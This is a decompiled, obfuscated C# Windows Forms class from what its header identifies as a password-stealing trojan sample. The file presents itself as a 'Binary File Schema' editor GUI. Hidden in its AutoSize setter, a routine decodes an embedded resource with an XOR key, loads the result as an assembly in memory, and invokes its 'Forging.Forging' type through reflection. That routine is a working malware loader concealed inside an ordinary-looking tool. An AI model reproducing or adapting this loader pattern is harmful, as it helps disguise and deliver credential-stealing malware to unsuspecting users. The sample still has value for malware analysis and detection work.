// Decompiled with JetBrains decompiler
// Type: ib.JbK
// Assembly: ContingentPropert, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 10450B75-DDB2-42D8-896D-5D92C0FA5DAE
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-f9a3872603bab9d16727daf3e24705ff94100d4bf2838679b5e9288aa02bd32a.exe

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace ib
{
  public class JbK : Form
  {
    private WH BLq;
    private string tLy;
    private IContainer rLu;
    private static object LL6;
    private ToolStrip OLB;
    private ToolStripButton uLn;
    private OpenFileDialog iLN;
    private SplitContainer bLP;
    private ToolStripButton HL5;
    private SplitContainer HLJ;
    private TreeView bLX;
    private ImageList tLI;
    private ListView RL9;
    private ColumnHeader ALK;
    private ImageList NLV;
    private ybT LLH;
    private ToolStripButton dLo;
    private ToolStripSeparator CLl;
    private ToolStripButton dLb;
    private ToolStripButton ULC;
    private ToolStripComboBox nLe;
    private ToolStripSeparator bLO;
    private ToolStripButton cLm;
    private SaveFileDialog MLc;
    internal static JbK UjQ;

    public JbK()
    {
      Jnb.vbPcO4();
      this.tLy = string.Empty;
      this.rLu = (IContainer) null;
      // ISSUE: explicit constructor call
      base.\u002Ector();
      this.yLk();
      int num1 = 0;
      if (false)
        goto label_3;
label_1:
      while (true)
      {
        switch (num1)
        {
          case 1:
            goto label_2;
          default:
            JbK.kj7((object) ((System.Type) JbK.LL6).GetMethod("DictionaryEnumerator"), (object) 0, (object) (object[]) new string[3]
            {
              "506172746974696F",
              "444A767532426D41",
              "BinaryFileSchemaGUI"
            });
            int num2;
            num1 = true ? 1 : num2;
            continue;
        }
      }
label_2:
      return;
label_3:
      num1 = 0;
      goto label_1;
    }

    private void lL1(object _param1, EventArgs _param2)
    {
      JbK.wjJ(JbK.Lj6((object) this.nLe), (object) new kbL());
      JbK.Hjw((object) this.nLe, 0);
    }

    private void BL7(object _param1, EventArgs _param2) => this.mLr();

    private void xLg(object _param1, EventArgs _param2)
    {
      if (this.iLN.ShowDialog() != DialogResult.OK)
        return;
      this.XLj(this.iLN.FileName);
      int num = 0;
      if (JbK.zjE() != null)
        goto label_5;
label_1:
      switch (num)
      {
        default:
          this.mLr();
          return;
      }
label_5:
      num = 0;
      goto label_1;
    }

    private void XLj(string _param1)
    {
      if (!File.Exists(_param1))
        return;
label_3:
      StreamReader streamReader = new StreamReader(_param1);
      string end = streamReader.ReadToEnd();
      int num = 0;
      if (JbK.qj3())
        goto label_4;
label_1:
      switch (num)
      {
        case 1:
          goto label_3;
        default:
          this.LLH.Text = end;
          streamReader.Close();
          this.LLH.Select(0, 0);
          this.tLy = _param1;
          JbK.ijL((object) this.cLm, true);
          return;
      }
label_4:
      num = 0;
      goto label_1;
    }

    private void mLr()
    {
      JbK.VjI((object) this.LLH, false);
      this.bLX.BeginUpdate();
      JbK.Hjo((object) this.RL9);
      Sbg sbg1 = (Sbg) new TbJ(this.RL9);
      string text = this.LLH.Text;
      int num1 = 2;
      while (true)
      {
        Stopwatch stopwatch;
        WH wh;
        switch (num1)
        {
          case 1:
            goto label_7;
          case 2:
            ((ListView.ListViewItemCollection) JbK.Bjp((object) this.RL9)).Clear();
            JbK.Qjm((object) this.bLX.Nodes);
            stopwatch = new Stopwatch();
            stopwatch.Start();
            wh = (WH) JbK.HjU((object) text, (object) sbg1);
            num1 = 3;
            continue;
          case 3:
            stopwatch.Stop();
            if (wh != null)
            {
              Sbg sbg2 = sbg1;
              string[] strArray = new string[5]
              {
                "Parsed and processed in ",
                null,
                null,
                null,
                null
              };
              long num2 = stopwatch.ElapsedMilliseconds;
              strArray[1] = num2.ToString();
              strArray[2] = " milliseconds (";
              num2 = stopwatch.ElapsedTicks;
              strArray[3] = num2.ToString();
              strArray[4] = " ticks)";
              string str = string.Concat(strArray);
              JbK.UjM((object) sbg2, (object) str);
              if (JbK.qj3())
              {
                num1 = 0;
                continue;
              }
              break;
            }
            JbK.ijL((object) this.ULC, false);
            num1 = 4;
            continue;
          case 4:
            this.LLH.IMh(true);
            this.bLX.EndUpdate();
            this.RL9.EndUpdate();
            if (JbK.zjE() == null)
            {
              num1 = 1;
              continue;
            }
            break;
          default:
            this.QLD(wh);
            Abk.NM1(wh, (RichTextBox) this.LLH);
            this.ULC.Enabled = true;
            this.BLq = wh;
            goto case 4;
        }
        int num3;
        num1 = num3;
      }
label_7:;
    }

    private string wLZ(PM _param1, string _param2) => _param2.Substring(_param1.uRd.hR4, _param1.uRd.ARG()).Trim();

    private void lLt(object _param1, TreeViewEventArgs _param2)
    {
      if (!(_param2.Node.Tag is Ho tag))
      {
        this.RL9.Items.Add("Error! No range was stored in the nodes!", 0);
        int num = 0;
        if (JbK.zjE() != null)
          goto label_3;
label_1:
        switch (num)
        {
          case 0:
            return;
          default:
            return;
        }
label_3:
        num = 0;
        goto label_1;
      }
      else
      {
        ybT llh = this.LLH;
        Hi hi = tag.aSZ();
        int start = hi.HfD();
        hi = tag.aSZ();
        int length = hi.nf2();
        llh.Select(start, length);
      }
    }

    private void QLD(WH _param1)
    {
      foreach (lZ lZ in (IEnumerable<lZ>) _param1.gfa())
      {
        int num1 = 0;
        if (JbK.zjE() == null)
          goto label_30;
label_3:
        TreeNode treeNode1;
        while (true)
        {
          switch (num1)
          {
            case 1:
              goto label_33;
            case 2:
              goto label_31;
            case 3:
              treeNode1 = this.bLX.Nodes.Add(lZ.vSF());
              treeNode1.Tag = (object) lZ;
              if (JbK.qj3())
              {
                num1 = 4;
                continue;
              }
              break;
            case 4:
              TreeNode treeNode2 = treeNode1;
              int num2;
              JbK.OjH((object) treeNode1, num2 = 0);
              int num3 = num2;
              treeNode2.ImageIndex = num3;
              switch (lZ)
              {
                case gN _:
                  if (JbK.zjE() == null)
                  {
                    num1 = 0;
                    continue;
                  }
                  break;
                case lk _:
                  goto label_5;
                case rr _:
                  goto label_27;
                default:
                  goto label_31;
              }
              break;
            default:
              if (lZ is RD)
              {
                num1 = JbK.zjE() != null ? 0 : 1;
                continue;
              }
              goto label_28;
          }
          int num4;
          num1 = num4;
        }
label_5:
        treeNode1.ImageIndex = treeNode1.SelectedImageIndex = 2;
        using (IEnumerator<cw> enumerator = (lZ as lk).Ih1().GetEnumerator())
        {
          while (enumerator.MoveNext())
          {
            cw current = enumerator.Current;
            TreeNode treeNode3 = ((TreeNodeCollection) JbK.Ejd((object) treeNode1)).Add(current.ToString());
            treeNode3.Tag = (object) current;
            treeNode3.ImageIndex = treeNode3.SelectedImageIndex = 4;
          }
          int num5 = 0;
          if (!JbK.qj3())
            goto label_23;
label_18:
          switch (num5)
          {
            default:
              goto label_31;
          }
label_23:
          int num6;
          num5 = num6;
          goto label_18;
        }
label_27:
        treeNode1.ImageIndex = treeNode1.SelectedImageIndex = 3;
        using (IEnumerator<DR> enumerator = (lZ as rr).IhE().GetEnumerator())
        {
          while (enumerator.MoveNext())
          {
            DR current = enumerator.Current;
            TreeNode treeNode4 = treeNode1.Nodes.Add(current.ToString());
            treeNode4.Tag = (object) current;
            treeNode4.ImageIndex = treeNode4.SelectedImageIndex = 4;
            int num7 = 0;
            if (JbK.qj3())
              goto label_10;
label_7:
            switch (num7)
            {
              default:
                continue;
            }
label_10:
            num7 = 0;
            goto label_7;
          }
          goto label_31;
        }
label_28:
        using (Dictionary<string, uy>.ValueCollection.Enumerator enumerator = (lZ as gN).Jv9().Values.GetEnumerator())
        {
          while (enumerator.MoveNext())
          {
            uy current = enumerator.Current;
            TreeNode treeNode5 = treeNode1.Nodes.Add(current.ToString());
            treeNode5.Tag = (object) current;
            treeNode5.ImageIndex = treeNode5.SelectedImageIndex = 4;
          }
          int num8 = 0;
          if (JbK.zjE() != null)
            goto label_40;
label_37:
          switch (num8)
          {
            default:
              goto label_31;
          }
label_40:
          num8 = 0;
          goto label_37;
        }
label_31:
        treeNode1.Expand();
        continue;
label_33:
        treeNode1.ImageIndex = treeNode1.SelectedImageIndex = 1;
        goto label_28;
label_30:
        num1 = 3;
        goto label_3;
      }
    }

    private void uLp(object _param1, EventArgs _param2)
    {
      if (((ListView.SelectedListViewItemCollection) JbK.kja((object) this.RL9)).Count == 0)
        return;
      if (!(JbK.Vjl((object) this.RL9.SelectedItems[0]) is Hbh))
        goto label_5;
      else
        goto label_7;
label_1:
      int num1;
      int num2 = num1;
label_2:
      string str;
      bool flag;
      string[] strArray;
      int lineNumber;
      while (true)
      {
        switch (num2)
        {
          case 1:
            goto label_13;
          case 2:
            goto label_8;
          case 3:
            if (flag)
            {
              strArray = str.Split("<,>".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
              num2 = !JbK.qj3() ? 0 : 0;
              continue;
            }
            goto label_10;
          default:
            lineNumber = Math.Max(int.Parse(strArray[0]) - 1, 0);
            int.Parse(strArray[1]);
            if (JbK.zjE() == null)
            {
              num2 = 1;
              continue;
            }
            goto label_1;
        }
      }
label_8:
      return;
label_10:
      return;
label_13:
      int num3 = Math.Max(this.LLH.GetFirstCharIndexFromLine(lineNumber), 0);
      int num4 = Math.Max(this.LLH.GetFirstCharIndexFromLine(lineNumber + 1) - num3, 0);
      JbK.yj0((object) this.LLH, num3, num4);
      this.LLH.Focus();
      goto label_10;
label_5:
      str = (string) JbK.WjS((object) this.RL9.SelectedItems[0]);
      flag = str.StartsWith("<");
      num2 = 3;
      if (JbK.qj3())
        goto label_2;
      else
        goto label_1;
label_7:
      Hbh tag = this.RL9.SelectedItems[0].Tag as Hbh;
      this.LLH.Select(JbK.fjk((object) tag).HfD(), tag.qQY().nf2());
      JbK.nj1((object) this.LLH);
      num2 = 2;
      goto label_2;
    }

    private void XLS(object _param1, EventArgs _param2)
    {
      this.LLH.Clear();
      this.ULC.Enabled = false;
      this.tLy = string.Empty;
    }

    private void NL2(object _param1, EventArgs _param2)
    {
      int num = (int) MessageBox.Show("Binary File Schema - By Anders Riggelsen, www.andersriggelsen.dk", "About Binary File Schema", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    private void FLW(object _param1, EventArgs _param2)
    {
      int num = (int) new Abv((this.nLe.SelectedItem as gbe).tvG(this.BLq), this.BLq.Kfw().vSF()).ShowDialog();
    }

    private void bLF(object _param1, EventArgs _param2)
    {
      int num1 = 2;
label_1:
      int num2 = num1;
      bool flag;
      StreamWriter streamWriter;
      while (true)
      {
        switch (num2)
        {
          case 1:
            if (flag)
              goto label_10;
label_9:
            streamWriter = new StreamWriter(this.tLy);
            streamWriter.Write(this.LLH.Text);
            if (JbK.qj3())
            {
              num2 = 0;
              continue;
            }
            goto label_1;
label_10:
            if (this.MLc.ShowDialog() == DialogResult.OK)
            {
              this.tLy = this.MLc.FileName;
              goto label_9;
            }
            else
              goto label_4;
          case 2:
            flag = this.tLy == string.Empty;
            num2 = JbK.qj3() ? 1 : 0;
            continue;
          default:
            goto label_8;
        }
      }
label_4:
      return;
label_8:
      JbK.Aj5((object) streamWriter);
    }

    protected override void Dispose(bool _param1)
    {
      bool flag = _param1 && this.rLu != null;
      int num1 = 0;
      if (JbK.zjE() != null)
        goto label_5;
label_1:
      switch (num1)
      {
        default:
          if (flag)
            this.rLu.Dispose();
          base.Dispose(_param1);
          return;
      }
label_5:
      int num2;
      num1 = num2;
      goto label_1;
    }

    public override bool AutoSize
    {
      get => JbK.PjR((object) this);
      set => JbK.sL8();
    }

    private static bool sL8()
    {
      // ISSUE: type reference
      byte[] numArray = (byte[]) JbK.UjB((object) new ResourceManager(JbK.CjN(__typeref (Abv))), (object) "SlowTech");
      string str = "AF94H5HH4V78J887ZB54FD";
      int num1 = 1;
      if (JbK.qj3())
        goto label_2;
label_1:
      int num2;
      num1 = num2;
label_2:
      while (true)
      {
        int num3;
        bool flag;
        switch (num1)
        {
          case 1:
            num3 = 69654;
            break;
          default:
            if (flag)
            {
              numArray[num3 % 34816] = JbK.@int((JbK.VLE((int) numArray[num3 % 34816] ^ (int) str[num3 % 22]) - JbK.VLE((int) numArray[(num3 + 1) % 34816]) + 256) % 256);
              num3 += -1;
              break;
            }
            goto label_6;
        }
        flag = num3 >= 0;
        if (JbK.zjE() == null)
          num1 = 0;
        else
          goto label_1;
      }
label_6:
      JbK.iLY(JbK.sjW((object) numArray));
      return true;
    }

    private static int VLE(int _param0) => _param0;

    private static byte @int(int x) => (byte) x;

    private static object sL0(byte[] _param0) => (object) Assembly.Load(_param0);

    private static void iLY(object _param0) => JbK.LL6 = (object) JbK.UjV((object) (Assembly) _param0, (object) "Forging.Forging");

    private void yLk()
    {
      this.rLu = (IContainer) new Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (JbK));
      this.OLB = new ToolStrip();
      this.dLo = new ToolStripButton();
      this.HL5 = new ToolStripButton();
      this.cLm = new ToolStripButton();
      this.CLl = new ToolStripSeparator();
      this.uLn = new ToolStripButton();
      this.bLO = new ToolStripSeparator();
      this.nLe = new ToolStripComboBox();
      this.ULC = new ToolStripButton();
      this.dLb = new ToolStripButton();
      this.iLN = new OpenFileDialog();
      int num1 = 11;
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 1:
            this.nLe.Size = new Size(75, 25);
            JbK.ijL((object) this.ULC, false);
            num1 = 26;
            continue;
          case 2:
            this.bLO.Size = new Size(6, 25);
            this.nLe.DropDownStyle = ComboBoxStyle.DropDownList;
            this.nLe.DropDownWidth = 64;
            this.nLe.Name = "toolComboLanguage";
            if (JbK.zjE() == null)
            {
              num1 = 1;
              continue;
            }
            break;
          case 3:
            this.bLP.SuspendLayout();
            JbK.wKc((object) this.HLJ.Panel1);
            if (JbK.zjE() == null)
            {
              num1 = 8;
              continue;
            }
            break;
          case 4:
            JbK.JKg((object) this.HLJ, 3);
            this.bLX.Dock = DockStyle.Fill;
            num1 = 19;
            continue;
          case 5:
            this.RL9.View = View.Details;
            this.RL9.ItemActivate += new EventHandler(this.uLp);
            this.ALK.Text = "Message";
            num1 = JbK.zjE() != null ? 8 : 15;
            continue;
          case 6:
            this.AutoSize = false;
            JbK.NK2((object) this.OLB.Items, (object) new ToolStripItem[9]
            {
              (ToolStripItem) this.dLo,
              (ToolStripItem) this.HL5,
              (ToolStripItem) this.cLm,
              (ToolStripItem) this.CLl,
              (ToolStripItem) this.uLn,
              (ToolStripItem) this.bLO,
              (ToolStripItem) this.nLe,
              (ToolStripItem) this.ULC,
              (ToolStripItem) this.dLb
            });
            this.OLB.Location = new Point(0, 0);
            this.OLB.Name = "toolStrip1";
            this.OLB.Size = new Size(720, 25);
            num1 = 20;
            continue;
          case 7:
            JbK.QKx((object) this);
            if (JbK.zjE() == null)
            {
              num1 = 6;
              continue;
            }
            break;
          case 8:
            this.HLJ.Panel2.SuspendLayout();
            this.HLJ.SuspendLayout();
            num1 = 7;
            continue;
          case 9:
            this.LLH.TabIndex = 0;
            this.LLH.Text = "";
            this.LLH.WordWrap = false;
            if (JbK.zjE() == null)
            {
              num1 = 21;
              continue;
            }
            break;
          case 10:
            // ISSUE: reference to a compiler-generated method
            this.dLb.Image = (Image) BinaryFileSchemaGUI.Properties.Resources.hMo();
            JbK.CKD((object) this.dLb, Color.Magenta);
            this.dLb.Name = "toolAbout";
            this.dLb.Size = new Size(60, 22);
            this.dLb.Text = "About";
            this.dLb.ToolTipText = "About";
            this.dLb.Visible = false;
            JbK.qKG((object) this.dLb, (object) new EventHandler(this.NL2));
            this.iLN.FileName = "*.fsc";
            this.iLN.Filter = "Binary File Schemas|*.fsc|All files|*.*";
            num1 = JbK.zjE() != null ? 33 : 37;
            continue;
          case 11:
            this.bLP = new SplitContainer();
            this.LLH = new ybT();
            this.RL9 = new ListView();
            this.ALK = new ColumnHeader();
            num1 = 35;
            continue;
          case 12:
            JbK.EKu((object) this.LLH, Color.Black);
            this.LLH.HideSelection = false;
            this.LLH.Location = new Point(0, 0);
            this.LLH.Name = "richTextBox";
            this.LLH.Size = new Size(525, 279);
            if (JbK.zjE() == null)
            {
              num1 = 9;
              continue;
            }
            break;
          case 13:
            JbK.gKr((object) this, (object) "Binary File Schema");
            this.Load += new EventHandler(this.lL1);
            this.OLB.ResumeLayout(false);
            num1 = JbK.qj3() ? 38 : 26;
            continue;
          case 14:
            this.HLJ.Panel2.Controls.Add((Control) this.bLX);
            this.HLJ.Size = new Size(720, 430);
            num1 = 25;
            continue;
          case 15:
            this.ALK.Width = 521;
            this.NLV.ImageStream = (ImageListStreamer) componentResourceManager.GetObject("imageListErrorIcons.ImageStream");
            this.NLV.TransparentColor = Color.Transparent;
            ((ImageList.ImageCollection) JbK.yKF((object) this.NLV)).SetKeyName(0, "information.png");
            ((ImageList.ImageCollection) JbK.yKF((object) this.NLV)).SetKeyName(1, "error.png");
            this.NLV.Images.SetKeyName(2, "stop.png");
            this.HLJ.Dock = DockStyle.Fill;
            this.HLJ.FixedPanel = FixedPanel.Panel2;
            this.HLJ.Location = new Point(0, 25);
            num2 = 27;
            break;
          case 16:
            goto label_21;
          case 17:
            this.CLl.Size = new Size(6, 25);
            num1 = 28;
            continue;
          case 18:
            this.ULC.ImageTransparentColor = Color.Magenta;
            this.ULC.Name = "toolGenerateCode";
            JbK.lKK((object) this.ULC, new Size(103, 22));
            this.ULC.Text = "Generate code";
            this.ULC.Click += new EventHandler(this.FLW);
            num2 = 10;
            break;
          case 19:
            this.bLX.ImageKey = "page_white_text.png";
            this.bLX.ImageList = this.tLI;
            this.bLX.Location = new Point(0, 0);
            this.bLX.Name = "treeBFSstructure";
            this.bLX.SelectedImageIndex = 0;
            if (JbK.zjE() == null)
            {
              num1 = 32;
              continue;
            }
            break;
          case 20:
            this.OLB.TabIndex = 1;
            JbK.gKr((object) this.OLB, (object) "toolStrip1");
            // ISSUE: reference to a compiler-generated method
            this.dLo.Image = (Image) BinaryFileSchemaGUI.Properties.Resources.TMb();
            this.dLo.ImageTransparentColor = Color.Magenta;
            this.dLo.Name = "toolNewSchema";
            this.dLo.Size = new Size(51, 22);
            this.dLo.Text = "New";
            this.dLo.ToolTipText = "New Schema";
            JbK.qKG((object) this.dLo, (object) new EventHandler(this.XLS));
            // ISSUE: reference to a compiler-generated method
            this.HL5.Image = (Image) BinaryFileSchemaGUI.Properties.Resources.vMV();
            this.HL5.ImageTransparentColor = Color.Magenta;
            JbK.yKX((object) this.HL5, (object) "toolOpenSchema");
            this.HL5.Size = new Size(56, 22);
            JbK.BKj((object) this.HL5, (object) "Open");
            this.HL5.Click += new EventHandler(this.xLg);
            // ISSUE: reference to a compiler-generated method
            this.cLm.Image = (Image) BinaryFileSchemaGUI.Properties.Resources.xM9();
            num1 = 33;
            continue;
          case 21:
            this.RL9.Columns.AddRange(new ColumnHeader[1]
            {
              this.ALK
            });
            this.RL9.Dock = DockStyle.Fill;
            this.RL9.HeaderStyle = ColumnHeaderStyle.Nonclickable;
            this.RL9.HideSelection = false;
            this.RL9.Location = new Point(0, 0);
            this.RL9.MultiSelect = false;
            this.RL9.Name = "listViewErrorBox";
            this.RL9.ShowGroups = false;
            num1 = 29;
            continue;
          case 22:
            this.uLn.Size = new Size(72, 22);
            this.uLn.Text = "Compile";
            this.uLn.Click += new EventHandler(this.BL7);
            this.bLO.Name = "toolStripSeparator2";
            num1 = JbK.zjE() != null ? 1 : 2;
            continue;
          case 23:
            this.tLI.Images.SetKeyName(4, "bullet_blue.png");
            this.MLc.FileName = "*.fsc";
            this.MLc.Filter = "Binary File Schemas|*.fsc|All files|*.*";
            this.AutoScaleDimensions = new SizeF(6f, 13f);
            this.AutoScaleMode = AutoScaleMode.Font;
            this.ClientSize = new Size(720, 455);
            this.Controls.Add((Control) this.HLJ);
            num2 = 36;
            break;
          case 24:
            this.bLX.TabIndex = 0;
            this.bLX.AfterSelect += new TreeViewEventHandler(this.lLt);
            JbK.pKA((object) this.tLI, (object) (ImageListStreamer) componentResourceManager.GetObject("imgListBlocks.ImageStream"));
            JbK.QKy((object) this.tLI, Color.Transparent);
            this.tLI.Images.SetKeyName(0, "database.png");
            if (JbK.zjE() == null)
            {
              num1 = 31;
              continue;
            }
            break;
          case 25:
            this.HLJ.SplitterDistance = 525;
            num1 = 4;
            continue;
          case 26:
            // ISSUE: reference to a compiler-generated method
            this.ULC.Image = (Image) BinaryFileSchemaGUI.Properties.Resources.gMN();
            num1 = JbK.zjE() != null ? 9 : 18;
            continue;
          case 27:
            this.HLJ.Name = "splitContainer2";
            this.HLJ.Panel1.BackColor = SystemColors.Control;
            this.HLJ.Panel1.Controls.Add((Control) this.bLP);
            num1 = JbK.qj3() ? 14 : 13;
            continue;
          case 28:
            // ISSUE: reference to a compiler-generated method
            this.uLn.Image = (Image) BinaryFileSchemaGUI.Properties.Resources.wM5();
            num1 = 30;
            continue;
          case 29:
            JbK.jKO((object) this.RL9, new Size(525, 147));
            this.RL9.SmallImageList = this.NLV;
            this.RL9.TabIndex = 1;
            this.RL9.UseCompatibleStateImageBehavior = false;
            if (JbK.qj3())
            {
              num1 = 5;
              continue;
            }
            break;
          case 30:
            this.uLn.ImageTransparentColor = Color.Magenta;
            this.uLn.Name = "toolCompileSchema";
            num2 = 22;
            break;
          case 31:
            ((ImageList.ImageCollection) JbK.yKF((object) this.tLI)).SetKeyName(1, "database_go.png");
            this.tLI.Images.SetKeyName(2, "comments.png");
            JbK.OKh((object) this.tLI.Images, 3, (object) "brick.png");
            if (JbK.qj3())
            {
              num1 = 23;
              continue;
            }
            break;
          case 32:
            this.bLX.Size = new Size(191, 430);
            if (JbK.qj3())
            {
              num1 = 24;
              continue;
            }
            break;
          case 33:
            this.cLm.ImageTransparentColor = Color.Magenta;
            this.cLm.Name = "toolSaveSchema";
            this.cLm.Size = new Size(51, 22);
            this.cLm.Text = "Save";
            this.cLm.Click += new EventHandler(this.bLF);
            this.CLl.Name = "toolStripSeparator1";
            if (JbK.qj3())
            {
              num1 = 17;
              continue;
            }
            break;
          case 34:
            this.bLP.Location = new Point(0, 0);
            this.bLP.Name = "splitContainer1";
            this.bLP.Orientation = Orientation.Horizontal;
            ((Control.ControlCollection) JbK.FK4(JbK.ajz((object) this.bLP))).Add((Control) this.LLH);
            this.bLP.Panel2.Controls.Add((Control) this.RL9);
            this.bLP.Size = new Size(525, 430);
            JbK.fKP((object) this.bLP, 279);
            this.bLP.TabIndex = 2;
            JbK.kKq((object) this.LLH, true);
            this.LLH.IMh(true);
            this.LLH.Dock = DockStyle.Fill;
            this.LLH.Font = new Font("Courier New", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            if (JbK.qj3())
            {
              num1 = 12;
              continue;
            }
            break;
          case 35:
            this.NLV = new ImageList(this.rLu);
            this.HLJ = new SplitContainer();
            this.bLX = new TreeView();
            this.tLI = new ImageList(this.rLu);
            this.MLc = new SaveFileDialog();
            this.OLB.SuspendLayout();
            ((Control) JbK.ajz((object) this.bLP)).SuspendLayout();
            ((Control) JbK.fKi((object) this.bLP)).SuspendLayout();
            num1 = 3;
            continue;
          case 36:
            JbK.HKt((object) this.Controls, (object) this.OLB);
            this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
            this.Name = "BFSGUI";
            if (JbK.qj3())
            {
              num1 = 13;
              continue;
            }
            break;
          case 37:
            this.bLP.Dock = DockStyle.Fill;
            this.bLP.FixedPanel = FixedPanel.Panel2;
            num1 = 34;
            continue;
          case 38:
            this.OLB.PerformLayout();
            this.bLP.Panel1.ResumeLayout(false);
            num1 = JbK.zjE() != null ? 0 : 0;
            continue;
          default:
            this.bLP.Panel2.ResumeLayout(false);
            this.bLP.ResumeLayout(false);
            this.HLJ.Panel1.ResumeLayout(false);
            this.HLJ.Panel2.ResumeLayout(false);
            JbK.yK8((object) this.HLJ, false);
            this.ResumeLayout(false);
            if (JbK.zjE() == null)
            {
              num1 = 16;
              continue;
            }
            break;
        }
        num1 = num2;
      }
label_21:
      this.PerformLayout();
    }

    internal static object kj7([In] object obj0, [In] object obj1, [In] object obj2) => ((MethodBase) obj0).Invoke(obj1, (object[]) obj2);

    internal static bool qj3() => JbK.UjQ == null;

    internal static JbK zjE() => JbK.UjQ;

    internal static object Lj6([In] object obj0) => (object) ((ToolStripComboBox) obj0).Items;

    internal static int wjJ([In] object obj0, [In] object obj1) => ((ComboBox.ObjectCollection) obj0).Add(obj1);

    internal static void Hjw([In] object obj0, [In] int obj1) => ((ToolStripComboBox) obj0).SelectedIndex = obj1;

    internal static void ijL([In] object obj0, [In] bool obj1) => ((ToolStripItem) obj0).Enabled = obj1;

    internal static void VjI([In] object obj0, bool _param1) => ((ybT) obj0).IMh(_param1);

    internal static void Hjo([In] object obj0) => ((ListView) obj0).BeginUpdate();

    internal static object Bjp([In] object obj0) => (object) ((ListView) obj0).Items;

    internal static void Qjm([In] object obj0) => ((TreeNodeCollection) obj0).Clear();

    internal static object HjU([In] object obj0, [In] object obj1) => (object) Xbm.eQZ((string) obj0, (Sbg) obj1);

    internal static void UjM([In] object obj0, [In] object obj1) => ((Sbg) obj0).hvD((string) obj1);

    internal static void OjH([In] object obj0, [In] int obj1) => ((TreeNode) obj0).SelectedImageIndex = obj1;

    internal static object Ejd([In] object obj0) => (object) ((TreeNode) obj0).Nodes;

    internal static object kja([In] object obj0) => (object) ((ListView) obj0).SelectedItems;

    internal static object Vjl([In] object obj0) => ((ListViewItem) obj0).Tag;

    internal static Hi fjk([In] object obj0) => ((Hbh) obj0).qQY();

    internal static bool nj1([In] object obj0) => ((Control) obj0).Focus();

    internal static object WjS([In] object obj0) => (object) ((ListViewItem) obj0).Text;

    internal static void yj0([In] object obj0, [In] int obj1, [In] int obj2) => ((TextBoxBase) obj0).Select(obj1, obj2);

    internal static void Aj5([In] object obj0) => ((TextWriter) obj0).Close();

    internal static bool PjR([In] object obj0) => __nonvirtual (((Form) obj0).AutoSize);

    internal static System.Type CjN([In] RuntimeTypeHandle obj0) => System.Type.GetTypeFromHandle(obj0);

    internal static object UjB([In] object obj0, [In] object obj1) => ((ResourceManager) obj0).GetObject((string) obj1);

    internal static object sjW([In] object obj0) => JbK.sL0((byte[]) obj0);

    internal static System.Type UjV([In] object obj0, [In] object obj1) => ((Assembly) obj0).GetType((string) obj1);

    internal static object ajz([In] object obj0) => (object) ((SplitContainer) obj0).Panel1;

    internal static object fKi([In] object obj0) => (object) ((SplitContainer) obj0).Panel2;

    internal static void wKc([In] object obj0) => ((Control) obj0).SuspendLayout();

    internal static void QKx([In] object obj0) => ((Control) obj0).SuspendLayout();

    internal static void NK2([In] object obj0, [In] object obj1) => ((ToolStripItemCollection) obj0).AddRange((ToolStripItem[]) obj1);

    internal static void gKr([In] object obj0, [In] object obj1) => ((Control) obj0).Text = (string) obj1;

    internal static void qKG([In] object obj0, [In] object obj1) => ((ToolStripItem) obj0).Click += (EventHandler) obj1;

    internal static void yKX([In] object obj0, [In] object obj1) => ((ToolStripItem) obj0).Name = (string) obj1;

    internal static void BKj([In] object obj0, [In] object obj1) => ((ToolStripItem) obj0).Text = (string) obj1;

    internal static void lKK([In] object obj0, [In] Size obj1) => ((ToolStripItem) obj0).Size = obj1;

    internal static void CKD([In] object obj0, [In] Color obj1) => ((ToolStripItem) obj0).ImageTransparentColor = obj1;

    internal static object FK4([In] object obj0) => (object) ((Control) obj0).Controls;

    internal static void fKP([In] object obj0, [In] int obj1) => ((SplitContainer) obj0).SplitterDistance = obj1;

    internal static void kKq([In] object obj0, [In] bool obj1) => ((TextBoxBase) obj0).AcceptsTab = obj1;

    internal static void EKu([In] object obj0, [In] Color obj1) => ((Control) obj0).ForeColor = obj1;

    internal static void jKO([In] object obj0, [In] Size obj1) => ((Control) obj0).Size = obj1;

    internal static object yKF([In] object obj0) => (object) ((ImageList) obj0).Images;

    internal static void JKg([In] object obj0, [In] int obj1) => ((Control) obj0).TabIndex = obj1;

    internal static void pKA([In] object obj0, [In] object obj1) => ((ImageList) obj0).ImageStream = (ImageListStreamer) obj1;

    internal static void QKy([In] object obj0, [In] Color obj1) => ((ImageList) obj0).TransparentColor = obj1;

    internal static void OKh([In] object obj0, [In] int obj1, [In] object obj2) => ((ImageList.ImageCollection) obj0).SetKeyName(obj1, (string) obj2);

    internal static void HKt([In] object obj0, [In] object obj1) => ((Control.ControlCollection) obj0).Add((Control) obj1);

    internal static void yK8([In] object obj0, [In] bool obj1) => ((Control) obj0).ResumeLayout(obj1);
  }
}
